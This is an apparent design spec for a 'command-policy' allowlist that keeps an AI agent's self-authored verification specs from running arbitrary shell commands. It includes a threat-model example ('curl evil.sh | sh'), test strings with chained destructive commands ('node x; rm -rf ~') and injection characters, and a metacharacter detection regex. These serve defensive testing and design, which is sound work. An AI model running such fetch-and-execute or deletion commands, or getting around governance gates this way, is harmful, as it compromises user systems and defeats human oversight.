---
id: spec:command-verifier-trust-boundary
status: draft
linkedPlan: plan:command-verifier-trust-boundary
---

# Command-Verifier Trust Boundary (P1-8)

## Context

The verification-contract engine's `command` verifier runs a spec-supplied
shell string with no restriction. [`run-verifiers.js`](../../../templates/cli/verification/run-verifiers.js)
`case 'command'` does:

```js
const out = exec(p.cmd, { cwd: repoRoot, timeout: 120000 }); // exec = execSync
```

`execSync(string)` runs the string through a shell (`/bin/sh -c` on POSIX,
`cmd.exe /d /s /c` on Windows). Any spec's acceptance criterion of type
`command` therefore executes arbitrary shell during `mem verify-contract run`.

In evo-lite's operating model the AI agent both **authors specs** and **runs
the CLI**. So a criterion like `{ "type": "command", "params": { "cmd": "curl evil.sh | sh" } }`
runs unsandboxed the moment `run` reaches it. This is the same class of risk
as "an agent evolves away a gate that blocks it" — a governance runtime must
not let agent-authored content silently execute arbitrary commands.

The prior external review flagged this as **P1-8** ("command shell-exec trust
boundary — allowlist/confirm/argv — still open for any non-fully-trusted repo").

## Root Cause

Two independent gaps, both in the `command` verifier path:

1. **No allowlist.** Any `cmd` value runs. There is no boundary distinguishing
   the one command evo-lite legitimately runs (`node ./.evo-lite/cli/test.js <scope>`,
   used by all 45 real `command` criteria) from an arbitrary agent-authored command.
2. **Shell interpretation.** `cmd` is passed to a shell, so metacharacters
   (`;`, `|`, `&`, `$()`, backticks, redirects) chain/inject regardless of what
   the leading command is.

## Goal

Default-deny the `command` verifier. An agent-authored spec cannot silently
execute arbitrary shell; a human opts in explicitly by curating a git-committed
allowlist. Legitimate self-hosting (`node ./.evo-lite/cli/test.js`) keeps
working out of the box, including in freshly-nurtured children.

## Non-Goals

- **argv-array form / execFileSync migration** — rejected. Would force a
  breaking rewrite of all 45 existing string-form `command` criteria. The
  metacharacter rejection below closes the shell-injection hole without it.
- **Runtime `--allow-commands` flag** — rejected. The agent runs the CLI and
  could pass the flag itself; the boundary must live in a human-curated,
  git-committed artifact, not a runtime toggle.
- **Sandboxing / containerization of the exec** — out of scope. The boundary is
  *which* commands may run, curated by a human, not isolating their side effects.
- **A new `BLOCKED` verdict state** — rejected. A blocked command is
  semantically UNVERIFIED (it did not run); reusing the existing state avoids a
  5th verdict rippling through contract-schema / derive-verdicts / close /
  status. See "Blocked semantics".
- **Making `command-policy.json` a managed gene** — rejected. The allowlist is
  per-repo project state each hive curates for itself; nurture must never
  overwrite a child's curated allowlist.

## Design

### Policy file (human-curated, git-committed)

`.evo-lite/verification/command-policy.json`:

```json
{
  "version": "evo-command-policy@1",
  "allow": [
    { "prefix": "node ./.evo-lite/cli/test.js" }
  ]
}
```

- **Not a gene.** Absent from `MANAGED_TEMPLATE_FAMILIES`. Nurture never writes
  it. Each child (and the mother) curates its own.
- **Git-tracked automatically.** `.evo-lite/verification/**/*.json` is already
  un-ignored (evidence pattern) in both root `.gitignore` and `templates/gitignore`.
  No gitignore change needed.
- **Entry forms** (an entry matches a `cmd` if either holds):
  - `{ "prefix": "<p>" }` — matches at a word boundary: `cmd === p || cmd.startsWith(p + " ")`.
    The boundary stops `prefix "node ./x"` from matching `node ./xevil`.
  - `{ "equals": "<c>" }` — matches iff `cmd === c`.
- **Built-in default when the file is ABSENT:** fall back to
  `[{ "prefix": "node ./.evo-lite/cli/test.js" }]` — the single command
  evo-lite's own governance suite runs. This keeps a freshly-nurtured child
  (which receives the new `run-verifiers.js` gene but no policy file) working;
  without it, every `command` criterion in the child would go UNVERIFIED and
  the child's verification would be dead on arrival. Security is preserved: the
  built-in default allows only the fixed, mother-controlled self-test command;
  any other (agent-authored) command still requires a human to add it.
- **Present-but-empty `allow`** (`{ "version": "...", "allow": [] }`) → pure
  default-deny. Blocks even the self-test. Explicit opt-out; distinct from absent.
- **Malformed file** (bad JSON, missing/​non-array `allow`, entry with neither
  `prefix` nor `equals`) → `loadPolicy` throws; the run surfaces the error and
  writes no evidence (fail-closed).

### New module: `templates/cli/verification/command-policy.js`

Pure, dependency-light, unit-testable.

```js
'use strict';
const fs = require('fs');
const path = require('path');

const POLICY_REL = ['.evo-lite', 'verification', 'command-policy.json'];
const BUILTIN_DEFAULT = { version: 'evo-command-policy@1',
    allow: [{ prefix: 'node ./.evo-lite/cli/test.js' }] };

// Any of these means the string can chain/inject/redirect through the shell.
// A legitimate `node ./.evo-lite/cli/test.js governance` contains none of them.
const SHELL_META = /[;&|$`<>()\n\r]/;

function loadPolicy(repoRoot) { /* absent -> BUILTIN_DEFAULT; parse+validate; throw on malformed */ }

function matchesEntry(cmd, entry) {
    if (typeof entry.equals === 'string') return cmd === entry.equals;
    if (typeof entry.prefix === 'string' && entry.prefix.length > 0) {
        return cmd === entry.prefix || cmd.startsWith(entry.prefix + ' ');
    }
    return false;
}

// { allowed: boolean, reason?: string }
function checkCommand(cmd, policy) {
    if (typeof cmd !== 'string' || cmd.trim() === '') {
        return { allowed: false, reason: 'empty command' };
    }
    if (SHELL_META.test(cmd)) {
        return { allowed: false, reason: `shell metacharacters not allowed: ${cmd}` };
    }
    const allow = (policy && Array.isArray(policy.allow)) ? policy.allow : [];
    if (!allow.some(e => matchesEntry(cmd, e))) {
        return { allowed: false, reason: `command not in command-policy.json allowlist: ${cmd}` };
    }
    return { allowed: true };
}

module.exports = { loadPolicy, checkCommand, matchesEntry, SHELL_META, POLICY_REL, BUILTIN_DEFAULT };
```

Ordering matters: metacharacter rejection runs **before** allowlist match, so a
`{ "prefix": "node ./.evo-lite/cli/test.js" }` entry can never be abused by
`node ./.evo-lite/cli/test.js; rm -rf ~` (the `;` is rejected first).

### Wiring: `run-verifiers.js`

In `runVerifier`'s `case 'command'`, before executing:

```js
case 'command': {
    const policy = opts.policy || loadPolicy(repoRoot);
    const check = checkCommand(p.cmd, policy);
    if (!check.allowed) {
        return { verdict: 'UNVERIFIED', detail: check.reason, blocked: true };
    }
    try {
        const out = exec(p.cmd, { cwd: repoRoot, timeout: 120000 });
        return { verdict: 'PASS', detail: `exit=0 ${truncate(out)}`.trim() };
    } catch (e) { /* unchanged FAIL path */ }
}
```

`opts.policy` (or `opts.loadPolicy`) is injectable so tests supply a policy
without touching disk.

### Wiring: `engine.js` runSpec

`runVerifier` may now return `blocked: true`. When it does, **skip
`writeRecord`** and record the block for CLI reporting:

```js
const result = runVerifier(c, { repoRoot: root, exec });
if (result.blocked) {
    written.push({ criterionId: c.id, verdict: 'UNVERIFIED', blocked: true, detail: result.detail });
    continue;                         // no evidence written
}
writeRecord(root, specId, { criterionId: c.id, verdict: result.verdict, /* ... */ });
written.push({ criterionId: c.id, verdict: result.verdict });
```

### Blocked semantics

A blocked command writes **no evidence record**. The criterion is therefore
UNVERIFIED *by absence* — the existing, well-tested meaning ("not yet
verified") — which preserves the invariant that stored verdicts are only
`{ PASS, FAIL }` (STALE/UNVERIFIED remain derived-only). `deriveVerdicts` needs
no change. The run CLI prints a distinct line per blocked criterion, e.g.
`⚠ <id>: UNVERIFIED — command not in command-policy.json allowlist: <cmd>`, so
a human sees why it is unverified and can curate the allowlist.

### CLI reporting

`mem verify-contract run` already iterates `written`. Extend its printout: for
an entry with `blocked: true`, print the ⚠ blocked line (reason included)
instead of a plain PASS/FAIL line. No new flags.

## Testing

Governance suite (`test/governance.js`), new T-numbers, all driving the pure
`checkCommand` / `loadPolicy` plus one `runVerifier` integration:

1. Metacharacter reject: `node x; rm -rf ~`, `a | b`, `$(x)`, `` `x` ``, `a && b`,
   `a > f`, `a\nb` each → `allowed:false`, reason mentions metacharacters.
2. Not-in-allowlist: `curl evil` with a policy allowing only the test prefix →
   `allowed:false`, allowlist reason.
3. Allowlisted prefix: `node ./.evo-lite/cli/test.js governance` → `allowed:true`.
4. Prefix word boundary: `node ./.evo-lite/cli/test.jsEVIL` → `allowed:false`
   (prefix must end at a space or string end).
5. `equals` form: exact match allowed; a trailing arg not allowed.
6. Absent policy file → `loadPolicy` returns BUILTIN_DEFAULT; self-test allowed.
7. Present-but-empty `allow` → self-test `allowed:false` (default-deny).
8. Malformed policy → `loadPolicy` throws.
9. `runVerifier` integration: a blocked command returns
   `{ verdict:'UNVERIFIED', blocked:true }` and (via an injected `exec` spy) the
   exec is **never called**.
10. `runSpec` integration: a blocked criterion writes no evidence record and
    appears in `written` with `blocked:true`.

## Acceptance Criteria

```json
{
  "criteria": [
  {
    "id": "ac-policy-default-deny",
    "description": "A command not in the allowlist yields UNVERIFIED and is never executed.",
    "verifier": { "type": "command", "params": { "cmd": "node ./.evo-lite/cli/test.js governance", "scope": "governance" } },
    "dependsOn": ["templates/cli/verification/command-policy.js", "templates/cli/verification/run-verifiers.js", "templates/cli/test/governance.js"]
  },
  {
    "id": "ac-policy-allowlist",
    "description": "An allowlisted prefix command runs and can PASS.",
    "verifier": { "type": "command", "params": { "cmd": "node ./.evo-lite/cli/test.js governance", "scope": "governance" } },
    "dependsOn": ["templates/cli/verification/command-policy.js", "templates/cli/test/governance.js"]
  },
  {
    "id": "ac-no-shell-injection",
    "description": "A command containing shell metacharacters is rejected regardless of allowlist match.",
    "verifier": { "type": "command", "params": { "cmd": "node ./.evo-lite/cli/test.js governance", "scope": "governance" } },
    "dependsOn": ["templates/cli/verification/command-policy.js", "templates/cli/test/governance.js"]
  },
  {
    "id": "ac-policy-not-a-gene",
    "description": "command-policy.json is not in MANAGED_TEMPLATE_FAMILIES, so nurture never overwrites a child's curated allowlist.",
    "verifier": { "type": "command", "params": { "cmd": "node ./.evo-lite/cli/test.js governance", "scope": "governance" } },
    "dependsOn": ["templates/cli/template-manifest.js", "templates/cli/test/governance.js"]
  },
  {
    "id": "ac-builtin-default",
    "description": "Absent policy file falls back to the built-in self-test allowlist; present-but-empty allow is pure default-deny.",
    "verifier": { "type": "command", "params": { "cmd": "node ./.evo-lite/cli/test.js governance", "scope": "governance" } },
    "dependsOn": ["templates/cli/verification/command-policy.js", "templates/cli/test/governance.js"]
  }
  ]
}
```

## Manifest & Mirror

- Register `verification/command-policy.js` in `MANAGED_TEMPLATE_FAMILIES.core-cli.files`
  (it IS a gene — the enforcement code is mother-owned).
- Do **not** register `command-policy.json` (project state, not a gene).
- Both `templates/cli/**` and `.evo-lite/cli/**` mirrors updated byte-identical;
  `mem sync-runtime` verifies parity; `npm test` runs the mirror.
- Commit a mother-side `.evo-lite/verification/command-policy.json` with the
  baseline allowlist so the mother's own governance suite keeps running under
  the new enforcement (and to dogfood the present-file path, not just the
  built-in default).

## Follow-up (not this spec)

- Seeding a default `command-policy.json` into a child during nurture (so the
  child has an explicit, inspectable policy rather than relying on the built-in
  default) — a nurture enhancement, deferred until a child needs a non-default
  allowlist.
- Per-criterion command trust levels / signing — not needed while the allowlist
  is a small human-curated file.
